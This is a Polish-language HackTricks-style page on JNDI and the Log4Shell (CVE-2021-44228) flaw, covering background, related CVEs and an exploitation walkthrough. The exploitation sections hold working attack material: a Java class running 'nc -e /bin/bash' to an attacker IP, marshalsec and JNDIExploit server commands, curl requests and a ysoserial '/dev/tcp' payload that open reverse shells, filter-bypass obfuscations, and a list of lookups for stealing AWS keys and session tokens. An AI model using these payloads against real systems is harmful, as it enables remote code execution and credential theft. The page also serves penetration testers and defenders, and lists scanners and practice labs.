# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>Zacznij od zera i sta si ekspertem od hakowania AWS dziki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) albo **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

**Try Hard Security Group**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Podstawowe informacje

JNDI, zintegrowane z Jav od koca lat 90., su偶y jako usuga katalogowa, umo偶liwiajc programom Javy lokalizacj danych lub obiekt贸w poprzez system nazw. Obsuguje r贸偶ne usugi katalogowe za pomoc interfejs贸w dostawcy usug (SPI), umo偶liwiajc pobieranie danych z r贸偶nych system贸w, w tym zdalnych obiekt贸w Javy. Wsp贸lne SPI obejmuj CORBA COS, Rejestr Java RMI i LDAP.

### Odwoania nazw JNDI

Obiekty Javy mog by przechowywane i pobierane za pomoc Odwoa Nazw JNDI, kt贸re wystpuj w dw贸ch formach:

* **Adresy odwoa**: Okrelaj lokalizacj obiektu (np. _rmi://serwer/odwoanie_), umo偶liwiajc bezporednie pobieranie z okrelonego adresu.
* **Zdalna fabryka**: Odwouje si do klasy zdalnej fabryki. Po dostpie klasa jest pobierana i instancjonowana z lokalizacji zdalnej.

Jednak ten mechanizm mo偶e by wykorzystany, co potencjalnie prowadzi do wczytywania i wykonania dowolnego kodu. Jako rodek zaradczy:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` domylnie od JDK 7u21, ograniczajc wczytywanie zdalnych obiekt贸w. Menad偶er bezpieczestwa dodatkowo ogranicza to, co mo偶e by wczytane.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` domylnie od JDK 6u141, 7u131, 8u121, blokujc wykonanie zdalnie wczytanych obiekt贸w Javy. Jeli ustawione na `true`, mo偶liwe jest wykonanie zdalnego kodu bez nadzoru Menad偶era bezpieczestwa.
* **CORBA**: Nie ma okrelonej waciwoci, ale Menad偶er bezpieczestwa jest zawsze aktywny.

Jednak **Menad偶er Nazw**, odpowiedzialny za rozwizywanie czy JNDI, nie posiada wbudowanych mechanizm贸w bezpieczestwa, co potencjalnie pozwala na pobieranie obiekt贸w z dowolnego 藕r贸da. Stanowi to ryzyko, poniewa偶 zabezpieczenia RMI, LDAP i CORBA mog zosta obejcia, prowadzc do wczytywania dowolnych obiekt贸w Javy lub wykorzystania istniejcych komponent贸w aplikacji (gad偶et贸w) do uruchamiania zoliwego kodu.

Przykady podatnych adres贸w URL to:

* _rmi://serwer-atakujcy/bar_
* _ldap://serwer-atakujcy/bar_
* _iiop://serwer-atakujcy/bar_

Mimo zabezpiecze, pozostaj podatnoci, g贸wnie z powodu braku zabezpiecze przed wczytywaniem JNDI z niezaufanych 藕r贸de i mo偶liwoci obejcia istniejcych zabezpiecze.

### Przykad JNDI

![](<../../.gitbook/assets/image (1022).png>)

Nawet jeli ustawie **`PROVIDER_URL`**, mo偶esz wskaza inny w wyszukiwaniu i zostanie on dostpny: `ctx.lookup("<kontrolowany-przez-atakujcego-url>")`, a to jest to, co atakujcy wykorzysta do wczytywania dowolnych obiekt贸w z systemu kontrolowanego przez niego.

### Przegld CORBA

CORBA (Common Object Request Broker Architecture) wykorzystuje **Interoperable Object Reference (IOR)** do unikalnej identyfikacji zdalnych obiekt贸w. To odwoanie zawiera istotne informacje, takie jak:

* **ID typu**: Unikalny identyfikator interfejsu.
* **Codebase**: URL do uzyskania klasy stub.

Warto zauwa偶y, 偶e CORBA nie jest wrodzony podatny. Zapewnienie bezpieczestwa zwykle obejmuje:

* Instalacja **Menad偶era Bezpieczestwa**.
* Konfiguracja Menad偶era Bezpieczestwa w celu zezwolenia na poczenia z potencjalnie zoliwymi codebase'ami. Mo偶na to osign poprzez:
* Uprawnienia gniazda, np. `permissions java.net.SocketPermission "*:1098-1099", "connect";`.
* Uprawnienia do odczytu plik贸w, albo uniwersalnie (`permission java.io.FilePermission "<<ALL FILES>>", "read";`) albo dla okrelonych katalog贸w, gdzie mog by umieszczone zoliwe pliki.

Jednak niekt贸re polityki dostawc贸w mog by poba偶liwe i domylnie zezwala na te poczenia.

### Kontekst RMI

Dla RMI (Remote Method Invocation) sytuacja jest nieco inna. Podobnie jak w przypadku CORBA, domylnie jest ograniczone pobieranie dowolnych klas. Aby wykorzysta RMI, zazwyczaj trzeba obej Menad偶era Bezpieczestwa, co jest r贸wnie偶 istotne w przypadku CORBA.

### LDAP

Po pierwsze, musimy odr贸偶ni midzy Wyszukiwaniem a Poszukiwaniem.\
**Wyszukiwanie** bdzie u偶ywa URL-a takiego jak `ldap://localhost:389/o=JNDITutorial`, aby znale藕 obiekt JNDITutorial na serwerze LDAP i **pobra jego atrybuty**.\
**Poszukiwanie** jest przeznaczone dla **usug nazw**, poniewa偶 chcemy **pobra to, co jest powizane z nazw**.

Jeli wywoano wyszukiwanie LDAP z **SearchControls.setReturningObjFlag() z `true`, to zwr贸cony obiekt zostanie odtworzony**.

Dlatego istnieje kilka sposob贸w ataku na te opcje.\
**Atakujcy mo偶e zatru rekordy LDAP wprowadzajc do nich adunki**, kt贸re zostan wykonane w systemach, kt贸re je zbieraj (bardzo przydatne do **skompromitowania dziesitek maszyn**, jeli masz dostp do serwera LDAP). Inny spos贸b wykorzystania tego polega na przeprowadzeniu **ataku typu MitM w wyszukiwaniu LDAP** na przykad.

W przypadku, gdy **aplikacja mo偶e rozwiza URL JNDI LDAP**, mo偶na kontrolowa wyszukiwane LDAP, i mo偶na odesa exploit (log4shell).

#### Wykorzystanie deserializacji

![](<../../.gitbook/assets/image (275).png>)

**Exploit jest zserializowany** i zostanie zdeserializowany.\
W przypadku, gdy `trustURLCodebase` jest ustawione na `true`, atakujcy mo偶e dostarczy swoje wasne klasy w codebase, jeli nie, bdzie musia wykorzysta gad偶ety w classpath.

#### Wykorzystanie odwoania JNDI

atwiej jest zaatakowa ten LDAP za pomoc **odwoa JavaFactory**:

![](<../../.gitbook/assets/image (1059).png>)

## Wra偶liwo Log4Shell

Wra偶liwo jest wprowadzona w Log4j, poniewa偶 obsuguje [**specjaln skadni**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) w postaci `${prefix:name}`, gdzie `prefix` jest jednym z r贸偶nych [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html), a `name` powinien by oceniony. Na przykad `${java:version}` to aktualna wersja Javy.

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) wprowadzi funkcj `jndi` Lookup. Ta funkcja umo偶liwia pobieranie zmiennych poprzez JNDI. Zazwyczaj klucz jest automatycznie prefiksowany jako `java:comp/env/`. Jednak jeli sam klucz zawiera **":"**, ten domylny prefiks nie jest stosowany.

Z **: obecnym** w kluczu, jak w `${jndi:ldap://przykad.com/a}`, **brak prefiksu** i **serwer LDAP jest zapytywany o obiekt**. Te Lookups mog by u偶ywane zar贸wno w konfiguracji Log4j, jak i podczas logowania linii.

Dlatego jedyn rzecz potrzebn do uzyskania RCE jest **wra偶liwa wersja Log4j przetwarzajca informacje kontrolowane przez u偶ytkownika**. Poniewa偶 jest to biblioteka szeroko u偶ywana przez aplikacje Javy do logowania informacji (w tym aplikacje dostpne w Internecie), byo bardzo powszechne, aby log4j logowa na przykad otrzymane nag贸wki HTTP, takie jak User-Agent. Jednak log4j **nie jest u偶ywany tylko do logowania informacji HTTP, ale dowolnego wejcia** i danych wskazanych przez programist.
## Przegld CVE zwizanych z Log4Shell

### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Krytyczny]**

Ta podatno to krytyczna **luka w nieskrystalizowanej deserializacji** w komponencie `log4j-core`, dotykajca wersji od 2.0-beta9 do 2.14.1. Pozwala na **zdalne wykonanie kodu (RCE)**, umo偶liwiajc atakujcym przejcie system贸w. Problem zosta zgoszony przez Chena Zhaojuna z zespou Alibaba Cloud Security i dotyka r贸偶nych framework贸w Apache. Pierwsza poprawka w wersji 2.15.0 bya niekompletna. Dostpne s reguy Sigma do obrony ([Regua 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [Regua 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)).

### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) **\[Krytyczny]**

Pocztkowo oceniona jako niska, ale p贸藕niej podniesiona do krytycznej, ta CVE to luka **Denial of Service (DoS)** wynikajca z niekompletnej poprawki w wersji 2.15.0 dla CVE-2021-44228. Dotyka konfiguracji niestandardowych, umo偶liwiajc atakujcym przeprowadzenie atak贸w DoS za pomoc specjalnie spreparowanych adunk贸w. [Tweet](https://twitter.com/marcioalm/status/1471740771581652995) prezentuje metod bypassu. Problem zosta rozwizany w wersjach 2.16.0 i 2.12.2 poprzez usunicie wzorc贸w wyszukiwania wiadomoci i domylne wyczenie JNDI.

### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[Wysoki]**

Dotykajca **wersji Log4j 1.x** w konfiguracjach niestandardowych korzystajcych z `JMSAppender`, ta CVE to luka w nieskrystalizowanej deserializacji. Brak dostpnej poprawki dla gazi 1.x, kt贸ra jest przestarzaa, zaleca si aktualizacj do `log4j-core 2.17.0`.

### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[redni]**

Ta podatno dotyka **frameworku logowania Logback**, nastpcy Log4j 1.x. Wczeniej uwa偶ano, 偶e framework jest bezpieczny, ale znaleziono w nim podatno, dlatego wydano nowe wersje (1.3.0-alpha11 i 1.2.9), aby rozwiza problem.

### **CVE-2021-45105** **\[Wysoki]**

Log4j 2.16.0 zawiera luk DoS, co skonio do wydania `log4j 2.17.0` w celu naprawienia CVE. Wicej szczeg贸贸w znajduje si w raporcie BleepingComputer [report](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).

### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)

Dotykajca wersji log4j 2.17, ta CVE wymaga, aby atakujcy kontrolowa plik konfiguracyjny log4j. Dotyczy potencjalnego wykonania arbitralnego kodu za pomoc skonfigurowanego JDBCAppender. Wicej szczeg贸贸w znajduje si w [posta na blogu Checkmarx](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Eksploatacja Log4Shell

### Odkrycie

Ta podatno jest bardzo atwa do odkrycia, jeli nie jest chroniona, poniewa偶 przynajmniej wyle **偶danie DNS** pod adres, kt贸ry wskazujesz w swoim adunku. Dlatego adunki takie jak:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (korzystajc z [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (korzystajc z [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (korzystajc z Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (korzystajc z [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (korzystajc z [huntress](https://log4shell.huntress.com))

Zauwa偶, 偶e **nawet jeli otrzymasz 偶danie DNS, nie oznacza to, 偶e aplikacja jest podatna** (ani nawet podatna), bdziesz musia spr贸bowa j wykorzysta.

{% hint style="info" %}
Pamitaj, 偶eby **wykorzysta wersj 2.15**, musisz doda **bypass sprawdzania lokalnego hosta**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Odkrywanie lokalne**

Szukaj **lokalnych podatnych wersji** biblioteki za pomoc:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Weryfikacja**

Niekt贸re z wymienionych platform pozwol Ci wstawi pewne zmienne dane, kt贸re zostan zapisane w momencie ich 偶dania.\
Mo偶e to by bardzo przydatne do 2 rzeczy:

* Do **zweryfikowania** podatnoci
* Do **wycieku informacji** poprzez nadu偶ycie podatnoci

Na przykad mo偶esz poprosi o co takiego:\
lub takie `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** i jeli **zostanie odebrany 偶danie DNS z wartoci zmiennej rodowiskowej**, wiesz, 偶e aplikacja jest podatna.

Inne informacje, kt贸re mo偶esz spr贸bowa **wyciec**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### Informacje o RCE

{% hint style="info" %}
Hosty dziaajce na wersjach JDK powy偶ej 6u141, 7u131 lub 8u121 s zabezpieczone przed atakiem zaadowania klasy LDAP. Wynika to z domylnego wyczenia `com.sun.jndi.ldap.object.trustURLCodebase`, co uniemo偶liwia JNDI zaadowanie zdalnej bazy kodu za porednictwem LDAP. Jednak偶e wa偶ne jest zauwa偶enie, 偶e te wersje **nie s chronione przed wektorem ataku deserializacji**.

Dla atakujcych d偶cych do wykorzystania tych wy偶szych wersji JDK, konieczne jest wykorzystanie **zaufanego gad偶etu** w aplikacji Java. Narzdzia takie jak ysoserial lub JNDIExploit s czsto u偶ywane w tym celu. W przeciwiestwie do tego, wykorzystanie ni偶szych wersji JDK jest stosunkowo atwiejsze, poniewa偶 te wersje mo偶na manipulowa w celu zaadowania i wykonania dowolnych klas.

Dla **wicej informacji** (_takich jak ograniczenia wektor贸w RMI i CORBA_) **sprawd藕 poprzedni sekcj odniesienia do JNDI Naming** lub [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec z niestandardowym adunkiem

Mo偶esz przetestowa to na **THM box:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)

U偶yj narzdzia [**marshalsec**](https://github.com/mbechler/marshalsec) (wersja jar dostpna [**tutaj**](https://github.com/RandomRobbieBF/marshalsec-jar)). Ten podejcie ustanawia serwer przekierowa LDAP, kt贸ry przekierowuje poczenia do drugiego serwera HTTP, gdzie bdzie hostowany exploit:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Aby zmusi cel do zaadowania kodu odwr贸conego powoki, stw贸rz plik Java o nazwie `Exploit.java` o poni偶szej zawartoci:
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
Skompiluj plik Java do pliku klasy u偶ywajc: `javac Exploit.java -source 8 -target 8`. Nastpnie uruchom **serwer HTTP** w katalogu zawierajcym plik klasy za pomoc: `python3 -m http.server`. Upewnij si, 偶e **serwer LDAP marshalsec** odnosi si do tego serwera HTTP.

Wywoaj wykonanie klasy exploit na podatnym serwerze internetowym, wysyajc adunek przypominajcy:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
**Uwaga:** To wykorzystanie opiera si na konfiguracji Javy umo偶liwiajcej zdalne adowanie kodu za pomoc LDAP. Jeli to nie jest dozwolone, rozwa偶 wykorzystanie zaufanej klasy do wykonania arbitralnego kodu.

### RCE - **JNDIExploit**

{% hint style="info" %}
Zauwa偶, 偶e z jakiego powodu autor usun ten projekt z github po odkryciu log4shell. Mo偶esz znale藕 zarchiwizowan wersj pod adresem [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2), ale jeli chcesz uszanowa decyzj autora, skorzystaj z innej metody wykorzystania tej podatnoci.

Co wicej, nie mo偶na znale藕 kodu 藕r贸dowego w wayback machine, wic albo przeanalizuj kod 藕r贸dowy, albo wykonaj plik jar, wiedzc, 偶e nie wiesz, co wykonujesz.
{% endhint %}

W tym przykadzie mo偶esz uruchomi **serwer internetowy podatny na log4shell** na porcie 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_w pliku README znajdziesz instrukcje jak go uruchomi_). Ta podatna aplikacja rejestruje zawarto nag贸wka 偶dania HTTP _X-Api-Version_ za pomoc podatnej wersji log4shell.

Nastpnie mo偶esz pobra plik jar **JNDIExploit** i go uruchomi za pomoc:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Po przeczytaniu kodu zaledwie kilka minut, w _com.feihong.ldap.LdapServer_ i _com.feihong.ldap.HTTPServer_ mo偶na zobaczy, jak **s tworzone serwery LDAP i HTTP**. Serwer LDAP bdzie rozumia, jakie dane potrzebuj by obsu偶one i przekieruje ofiar do serwera HTTP, kt贸ry dostarczy exploit.\
W _com.feihong.ldap.gadgets_ mo偶na znale藕 **kilka konkretnych gad偶et贸w**, kt贸re mog by u偶yte do wykonania po偶danej akcji (potencjalnie wykonujcej arbitralny kod). Natomiast w _com.feihong.ldap.template_ mo偶na zobaczy r贸偶ne klasy szablon贸w, kt贸re **generuj exploity**.

Mo偶na zobaczy wszystkie dostpne exploity za pomoc **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Kilka przydatnych to:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Wic, w naszym przykadzie, mamy ju偶 uruchomion podatn aplikacj dockerow. Aby j zaatakowa:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Kiedy wysyasz ataki, zobaczysz pewne wyniki w terminalu, w kt贸rym uruchomie **JNDIExploit-1.2-SNAPSHOT.jar**.

**Pamitaj, aby sprawdzi `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` w celu uzyskania innych opcji eksploatacji. Ponadto, w razie potrzeby, mo偶esz zmieni port serwer贸w LDAP i HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

Podobnie jak w poprzedniej eksploatacji, mo偶esz spr贸bowa u偶y [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) do wykorzystania tej podatnoci.\
Mo偶esz wygenerowa adresy URL do wysania do ofiary, uruchamiajc:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_To atak przy u偶yciu niestandardowo wygenerowanego obiektu javy bdzie dziaa w laboratoriach takich jak **THM solar room**. Jednak偶e, og贸lnie rzecz biorc, to nie zadziaa (poniewa偶 domylnie Java nie jest skonfigurowana do adowania zdalnego codebase za pomoc LDAP), poniewa偶 nie wykorzystuje zaufanej klasy do wykonania dowolnego kodu._

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) to kolejne narzdzie do generowania **dziaajcych link贸w JNDI** i dostarczania usug ta poprzez uruchamianie serwera RMI, serwera LDAP i serwera HTTP.

### RCE - ysoserial & JNDI-Exploit-Kit

Ta opcja jest naprawd przydatna do atakowania **wersji Javy skonfigurowanych do zaufania tylko okrelonym klasom, a nie wszystkim**. Dlatego **ysoserial** bdzie u偶ywany do generowania **serializacji zaufanych klas**, kt贸re mog by u偶ywane jako gad偶ety do **wykonywania dowolnego kodu** (_zaufana klasa wykorzystywana przez ysoserial musi by u偶ywana przez program javy ofiary, aby atak zadziaa_).

Korzystajc z **ysoserial** lub [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) mo偶esz stworzy exploit deserializacji, kt贸ry zostanie pobrany przez JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
U偶yj [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit), aby wygenerowa **JNDI linki**, gdzie exploit bdzie czeka na poczenia z podatnych maszyn. Mo偶esz serwowa **r贸偶ne exploity, kt贸re mog by automatycznie generowane** przez JNDI-Exploit-Kit lub nawet swoje **wasne adunki deserializacji** (wygenerowane przez Ciebie lub ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (1118).png>)

Teraz mo偶esz atwo u偶y wygenerowanego linku JNDI do wykorzystania podatnoci i uzyskania **odwr贸conego shella** wysyajc go do podatnej wersji log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Ominicia
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:谋}}:ldap://...} //Notice the unicode "i"
```
### Automatyczne skanery

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Znajd藕 lokalne podatne biblioteki

### Laboratoria do test贸w

* [**Maszyna LogForge HTB**](https://app.hackthebox.com/tracks/UHC-track)
* [**Pomieszczenie Solar w Try Hack Me**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Eksploatacja po Log4Shell

W tym [**opisie CTF**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) jest dobrze wyjanione, jak potencjalnie **mo偶na wykorzysta** niekt贸re funkcje **Log4J**.

Na [**stronie zabezpiecze**](https://logging.apache.org/log4j/2.x/security.html) Log4j znajduj si interesujce zdania:

> Od wersji 2.16.0 (dla Java 8) funkcja **wyszukiwania wiadomoci zostaa cakowicie usunita**. **Wyszukiwania w konfiguracji wci偶 dziaaj**. Ponadto, Log4j teraz domylnie wycza dostp do JNDI. Wyszukiwania JNDI w konfiguracji musz teraz by wczone explicite.

> Od wersji 2.17.0 (oraz 2.12.3 i 2.3.1 dla Java 7 i Java 6), **tylko acuchy wyszukiwania w konfiguracji s rozwijane rekurencyjnie**; w ka偶dym innym u偶yciu, rozwizywany jest tylko najwy偶szy poziom wyszukiwania, a 偶adne zagnie偶d偶one wyszukiwania nie s rozwizywane.

Oznacza to, 偶e domylnie nie mo偶na **u偶ywa 偶adnego exploitu `jndi`**. Ponadto, aby wykona **rekurencyjne wyszukiwania**, musisz je skonfigurowa.

Na przykad, w tym CTF byo to skonfigurowane w pliku log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Poszukiwanie rodowiska

W [tym CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) atakujcy kontrolowa warto `${sys:cmd}` i musia wydoby flag z zmiennej rodowiskowej.\
Jak wida na tej stronie w [**poprzednich adunkach**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) istniej r贸偶ne sposoby dostpu do zmiennych rodowiskowych, takie jak: **`${env:FLAG}`**. W tym CTF byo to bezu偶yteczne, ale mo偶e by przydatne w innych scenariuszach 偶ycia codziennego.

### Wydobywanie w wyjtkach

W CTF, **nie mo偶na byo uzyska dostpu do stderr** aplikacji Java za pomoc log4J, ale wyjtki Log4J **s wysyane do stdout**, co byo drukowane w aplikacji Python. Oznaczao to, 偶e wywoujc wyjtek moglimy uzyska dostp do zawartoci. Wyjtkiem do wydobycia flagi byo: **`${java:${env:FLAG}}`.** Dziaa to, poniewa偶 **`${java:CTF{blahblah}}`** nie istnieje, a wyjtek z wartoci flagi zostanie pokazany:

![](<../../.gitbook/assets/image (1023).png>)

### Wyjtki wzorc贸w konwersji

Warto wspomnie, 偶e mo偶na r贸wnie偶 wstrzykn nowe [**wzorce konwersji**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) i wywoa wyjtki, kt贸re zostan zapisane w `stdout`. Na przykad:

![](<../../.gitbook/assets/image (683).png>)

To nie byo przydatne do wydobycia daty z wiadomoci o bdzie, poniewa偶 wyszukiwanie nie zostao rozwizane przed wzorcem konwersji, ale mo偶e by przydatne do innych rzeczy, takich jak wykrywanie.

### Wzorce konwersji Regexes

Jednak偶e, mo偶na u偶y niekt贸rych **wzorc贸w konwersji, kt贸re obsuguj wyra偶enia regularne** do wydobycia informacji z wyszukiwania, korzystajc z wyra偶e regularnych i nadu偶ywajc zachowa **przeszukiwania binarnego** lub **opartych na czasie**.

* **Przeszukiwanie binarne za pomoc komunikat贸w o wyjtkach**

Wzorzec konwersji **`%replace`** mo偶e by u偶yty do **zastpienia** **zawartoci** w **acuchu znak贸w** nawet za pomoc **wyra偶e regularnych**. Dziaa to w ten spos贸b: `replace{pattern}{regex}{substitution}`\
